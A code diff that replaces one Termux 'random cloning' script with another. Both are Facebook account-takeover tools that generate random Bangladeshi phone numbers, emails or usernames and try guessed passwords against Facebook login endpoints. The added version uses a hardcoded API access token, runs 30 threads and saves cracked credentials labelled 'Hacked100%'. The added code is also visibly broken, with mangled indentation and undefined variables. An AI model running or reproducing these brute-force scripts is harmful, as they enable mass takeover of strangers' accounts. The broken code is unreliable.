@@ -1,305 +1,349 @@
-"#Code By Qaiser Abbas"
-
-"#Using Pure Python Utf-8"
-
-"#Best For Termux Users"
-
-#Free To Use Dont Forget To Give Credits
-
-"----Installing Modules ------"
-
-import os,sys
-
+# Decompile by KangEhem:)
+# with (uncompyle6) version : 3.7.4
+# Time Succes decompile : 2022-09-07 08:13:36.727454
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(7000):
+    number = random.randint(111111, 999999)
+    
+    sys.stdout = open('.txt', 'a')
+    print(number)
+    sys.stdout.flush()
+    
 try:
-
-	import requestsexcept:python free.py
-
-	os.system("pip install requests")
-
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    
 try:
-
-	import colorama
-
-except:
-
-	os.system("pip install colorama")
-
-"------Modules------"
-
-from time import sleep
-
-from re import search as qsr
-
-from os import system
-
-import random
-
-from colorama import Fore, Back, Style
-
-"-----Colors-----"
-
-r = Fore.RED
-
-g = Fore.GREEN 
-
-c = Fore.CYAN
-
-p = Fore.BLUE
-
-s = Style.RESET_ALL
-
-"-----Logo-----"
-
-logo = f"""
-
-    ________  _______     ______   
-
-   |_   __  ||_   __ \   / ____ `. 
-
-     | |_ \_|  | |__) |  `'  __) | 
-
-     |  _|     |  __ /   _  |__ '. 
-
-    _| |_     _| |  \ \_| \____) | 
-
-   |_____|   |____| |___|\______.'
-
-{(40*"=")}
-
-\tAdmin : Nayem
-
-\tTool  : Random Clone
-
-\tVersion : 1.00
-
-{(40*"=")}
-
-"""
-
-"-----Empty Values For Append ------"
-
-mails=[]
-
-ok=[]
-
-cp=[]
-
-loop=0
-
-"-----Main-Menu-----"
-
-def xmen():
-
-	system("clear");print(logo)
-
-	print("[1] Random Number Cloning")
-
-	print("[2] Random Mail Cloning")
-
-	print("[3] Random Username Cloning")
-
-	print("[0] Exit")
-
-	xmen=input("\n Select :")
-
-	if xmen in ['1','01']:
-
-		system("clear");print(logo)
-
-		print(' [-] Example 92333,92304,92312')
-
-		num = input(' Code : ')
-
-		print(' [-] Limit 10000,2000,6000')
-
-		limit = int(input(' Limit : '))
-
-		if int(num) < int(5):
-
-			exit("invalid type")
-
-		for tot in range(limit):
-
-			bz = random.randint(1111111,9999999)
-
-			nm = ''.join(num+str(bz))
-
-			mails.append(nm)
-
-		system("clear");print(logo)
-
-		print(" cloning is started .....")
-
-		print(" it took time to print ok ....")
-
-		print(40*"=")
-
-		for id in mails:
-
-			pw = [num+str(bz),bz]
-
-			clone(id,pw,limit)
-
-		print(" \ncloning is completed ")
-
-		print(f" total ok {str(len(ok))}")
-
-		exit()
-
-			
-
-	if xmen in ['2','02']:
-
-		system("clear");print(logo)
-
-		print(' [-] Example Ali,Qaiser,Syed')
-
-		first = input(' First : ')
-
-		print(' [-] Example khan,ali,ahmad')
-
-		last = input(' Last : ')
-
-		print(' [-] Example @gmail.com,@hotmail.com')
-
-		domain = input(' First : ')
-
-		print(' [-] Limit 10000,2000,6000')
-
-		limit = int(input(' Limit : '))
-
-		for tot in range(limit):
-
-			bz = random.randint(99,9999)
-
-			nm = ''.join(first+last+str(bz)+domain)
-
-			mails.append(nm)
-
-		system("clear");print(logo)
-
-		print(" cloning is started .....")
-
-		print(" it took time to print ok ....")
-
-		print(40*"=")
-
-		for id in mails:
-
-			pw = [first+last,first,last]
-
-			clone(id,pw,limit)
-
-		print(" \ncloning is completed ")
-
-		print(f" total ok {str(len(ok))}")
-
-		exit()
-
-		
-
-	if xmen in ['3','03']:
-
-		system("clear");print(logo)
-
-		print(' [-] Example Ali,Qaiser,Syed')
-
-		first = input(' First : ')
-
-		print(' [-] Example khan,ali,ahmad')
-
-		last = input(' Last : ')
-
-		print(' [-] Limit 10000,2000,6000')
-
-		limit = int(input(' Limit : '))
-
-		for tot in range(limit):
-
-			bz = random.randint(99,9999)
-
-			nm = ''.join(first+last+str(bz))
-
-			mails.append(nm)
-
-		system("clear");print(logo)
-
-		print(" cloning is started .....")
-
-		print(" it took time to print ok ....")
-
-		print(40*"=")
-
-		for id in mails:
-
-			pw = [first+last,first,last]
-
-			clone(id,pw,limit)
-
-		print(" \ncloning is completed ")
-
-		print(f" total ok {str(len(ok))}")
-
-		exit()
-
-	if xmen in ['0','00']:
-
-		exit("Thanks For Use")
-
-	else:	exit(f"{r}Invalid Search{s}")
-
-def clone(id,pw,limit):
-
-	global ok,cp,loop
-
-	for pas in pw:
-
-		sys.stdout.write(f'\r {limit}/{loop} - {str(len(ok))}'),
-
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 number.py')
+    
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+def exb():
+	print '[!] Exit'
+	os.sys.exit()
+def psb(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
 		sys.stdout.flush()
-
-		try:
-
-			url = "https://free.facebook.com/login/device-based/regular/login/?refsrc"
-
-			ro = requests.get('https://x.facebook.com').text
-
-			hed = {'user-agent': 'Mozilla/5.0 (Linux; U; Android 13;  en-us; GT-C143Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4461.84 Mobile Safari/537.36', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'Connection': 'keep-alive', 'authority': 'free.facebook.com', 'method': 'GET', 'scheme': 'https', 'accept-language': 'en-US,en;q=1', 'cache-control': 'no-cache, no-store, must-revalidate', 'referer': 'https://x.facebook.com/', 'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Windows', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?0', 'pragma': 'no-cache', 'priority': 'u=0', 'cross-origin-resource-policy': 'cross-origin', 'upgrade-insecure-requests': '1'}
-
-			dat = {"lsd":qsr('name="lsd" value="(.*?)"', str(ro)).group(1),"jazoest":qsr('name="jazoest" value="(.*?)"', str(ro)).group(1),"m_ts":qsr('name="m_ts" value="(.*?)"', str(ro)).group(1),"li":qsr('name="li" value="(.*?)"', str(ro)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":pas,"login":"Log In"}
-
-			r = requests.post(url,data=dat,headers=hed)
-
-			if "checkpoint" in r.text:
-
-				print(f"{r}[CP] {id} | {pas}{s}")
-
-				cp.append(id)
-
-				open("/sdcard/u_cp.txt",'a').write(id+' - '+pas)
-
-				break
-
-			elif 'c_user' in r.text:
-
-				print(f"{g}[CP] {id} | {pas}{s}")
-
-				ok.append(id)
-
-				open("/sdcard/u_ok.txt",'a').write(id+' - '+pas)
-
-				break
-
-			else:
-
-				pass
-
-		except:
-
-			pass
-
-	loop+=1
-
+		time.sleep(0.03)
+def t():
+    time.sleep(1)
+def cb():
+    os.system('clear')
+B='\033[1;94m'
+K='\033[1;90m'
+M='\033[1;98m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+logo = """
+\033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+\033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+\033[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+\033[1;94m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+*_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
+\033[1;91m        █▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
+\033[1;93m        █░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
+\033[1;92m        ▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
+\033[1;97m        █░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
+\033[1;96m        █▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
+\033[1;95m        ▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
+\033[1;95m ____   __    __    _   _    __   
+\033[1;95m(_  _) /__\  (  )  ( )_( )  /__\  
+ \033[1;95m )(  /(__)\  )(__  ) _ (  /(__)\ 
+ \033[1;95m(__)(__)(__)(____)(_) (_)(__)(__)
+*_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
+\033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+\033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+\033[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+\033[1;94m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
+💕🍃🌹🍃💕
+💕.•°``°•.¸.•°``°•.💕
+   (   🍃 🌹 🍃   ) 💕
+ 💕`•.¸   💗   ¸.•` 💕 
+     💕° •.¸¸.•° 💕   MAFIA-KILLER-Talha☕
+           💕💕         BE HAPPY 🍃🌻🍃
+             💕     💕🍃🌹🍃💕  .💘
+                    💕.•°``°•.¸.•°``°•.💕
+                   💕(  🍃 🌹 🍃   ) 💕
+                     💕`•.¸   💗   ¸.•` 💕
+                          💕° •.¸¸.•° 💕
+                                💕💕
+                                  💕         
+"""
+logo2 = """
+\x1b[1;92m➣ NAME :           💗 TALHA ISLAM 💗
+\x1b[1;91m➣ PGE NAME :  💣TERMUX TEACHER TALHA💣
+\x1b[1;93m➣ WHATSAPP NO :   👬 +8801304002896 👬
+\x1b[1;95m➣ WARNING :  👉 DON,T CALL ME ONLY TEXT🔫
+\x1b[1;96m➣ CLONING COUNTRY NAME :  BANGLADESH
+\x1b[1;97m➣ NOTE :      💕USE 4GB YA 6GB RAM MOBILE💕
+\x1b[1;92m➣ NOTE :      👏USE FAST 4G SIM NET👏
+\x1b[1;91m➣ NOTE :      🌍 1ST CLEAR TERMUX MEMORY DATA🌍
+\x1b[1;95m➣ NOTE :  🔎NO NEED VPN🔎 ( 🌷WITHOUT LOGIN🌷 )
+\x1b[1;93m➣ DISCLAMIAR :  👊AWAY FROM ILLIGAL WAY👊
+\x1b[1;93m
+"""
+back = 0
+successful = []
+checkpoint = []
+successfull = []
+id = []
+os.system("clear")
+print  """
+      💙💙                    💙💙 
+    💙🍁🍁💙   💙🍁🍁💙
+  💙 🍁🍁🍁💙🍁🍁🍁 💙
+   💙🍁🍁🍁🍁🍁🍁🍁💙
+     💙🍁🍁🍁🍁🍁🍁💙
+          💙🍁🍁🍁🍁💙
+               💙🍁🍁💙          
+        ❤❤  💙 💙 ❤❤
+   ❤🍃🍃❤ 💙❤🍃🍃❤
+  ❤ 🍃🍃🍃❤🍃🍃🍃 ❤
+   ❤🍃🍃🍃🍃🍃🍃🍃❤
+     ❤🍃🍃🍃🍃🍃🍃❤
+          ❤🍃🍃🍃🍃❤
+               ❤🍃🍃❤
+                   ❤ ❤ 
+                      ❤ 
+ """
+def login():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
 		
-
-xmen()
+def menu():
+	os.system('clear')
+	print logo
+	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-TALHA)💘💘💘━━━━━━━━💖\n" 
+	print '\033[1;97m[1]\033[1;92m GP'
+	print '\033[1;97m[2]\033[1;92m Robi'
+	print '\033[1;97m[3]\033[1;92m Airtel'
+	print '\033[1;97m[4]\033[1;92m Banglalink'
+	print '\033[1;97m[5]\033[1;92m Teletalk'
+	print '\033[1;97m[6]\033[1;92m Youtube'
+	print '\033[1;97m[0]\033[1;92m Exit            '
+	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-TALHA)💘💘💘━━━━━━━━💖\n" 
+	action()
+	
+def action():
+	ahmad = raw_input('\n\033[1;91m>>>  ')
+	if ahmad =='':
+		print '[!] Fill in correctly'
+		action()
+	elif ahmad =="1":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="2":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m180,181, 182, 183, 184, 185, 186, 187, 188, 189")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="3":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m160,161, 162, 163, 164, 165, 166, 167, 168, 169")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="4":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="5":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m150,151, 152, 153, 154, 155, 156, 157, 158, 159")
+		try:
+			c = raw_input("\033[1;96m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif ahmad =="6":		
+		os.system('xdg-open https://youtube.com/c/TalhaTechnologychannel')
+		login()
+	elif ahmad =='0':
+		exb()
+	else:
+		print '[!] Fill in correctly'
+		action()
+	xxx = str(len(id))
+	psb ('[✓] Total Numbers: '+xxx)
+	time.sleep(0.5)
+	psb ('\033[1;91m[✓]\033[1;94m Please wait, process is running ...')
+	time.sleep(0.5)
+	psb ('[!] To Stop Process Press CTRL+z')
+	time.sleep(0.5)
+	print "\033[1;96m💖━━━━━━━━━━💘💘💘(MAFIA-KILLER-Talha)💘💘💘━━━━━━━━━💖\n" 
+	
+	
+			
+	def main(arg):
+		global checkpoint,successfull
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;96m[Talha-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+ 				else:
+ 				    pass2="786786"
+ 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				    q = json.load(data)
+ 				    if 'access_token' in q:
+ 				        print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
+ 				        okb = open('save/successfull.txt', 'a')
+ 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 				        okb.close()
+ 				        oks.append(c+user+pass2)
+ 				    else:
+ 				        if 'www.facebook.com' in q['error_msg']:
+ 					        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
+ 					        cps = open('save/checkpoint.txt', 'a')
+ 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 					        cps.close()
+ 					        cpb.append(c+user+pass2)
+                                        else:
+ 				            pass3="bangladesh123"
+ 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				            q = json.load(data)
+ 				            if 'access_token' in q:
+ 				                print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
+ 				                okb = open('save/successfull.txt', 'a')
+ 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 				                okb.close()
+ 				                oks.append(c+user+pass3)
+ 				            else:
+ 				                if 'www.facebook.com' in q['error_msg']:
+ 					                print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
+ 					                cps = open('save/checkpoint.txt', 'a')
+ 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 					                cps.close()
+ 					                cpb.append(c+user+pass3)
+                                                else:
+ 				                    pass4="banglades"
+ 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				                    q = json.load(data)
+ 				                    if 'access_token' in q:
+ 				                        print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
+ 				                        okb = open('save/successfull.txt', 'a')
+ 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 				                        okb.close()
+ 				                        oks.append(c+user+pass4)
+ 				                    else:
+ 				                        if 'www.facebook.com' in q['error_msg']:
+ 					                        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
+ 					                        cps = open('save/checkpoint.txt', 'a')
+ 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 					                        cps.close()
+ 					                        cpb.append(c+user+pass4)
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;96m💖━━━━━━━━━━━━💘💘💘(MAFIA-KILLER-Talha)💘💘💘━━━━━━━━━━━💖" 
+	print '[✓] Process Has Been Completed ....'
+	print '[✓] Total OK/CP : '+str(len(successfull))+'/'+str(len(checkpoint))
+	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	print"""
+(¯`🌹¯)🌷
+`*.🍃.*´. 🌸🍃🌸:*¸. • 
+¸.•´¸.•*¨) ¸🌹•*¨) 🌸 
+🌸(¸.•´🍃(¸.•´ .•´ 🍃¸.🌸
+🔮🌷*.*.¸¸¸¸.*.*.¸¸🌷🔮 　　┊　┊　┊
+🔮🌷LOVE YOU🌷🔮 
+　　┊　┊　┊
+　　┊　┊    🔮   　　　
+　　┊   🔮
+　   🔮
+(¯`🌹¯)🌷
+`*.🍃.*´. 🌸🍃🌸:*¸. • 
+¸.•´¸.•*¨) ¸🌹•*¨) 🌸 
+🌸(¸.•´🍃(¸.•´ .•´ .🌸
+	"""
+	raw_input('\n[Press Enter To Go Back]')
+	os.system('python2 hack.py')
+		
+if __name__ == '__main__':
+	menu()
+# Mau Ngapain Cuk?
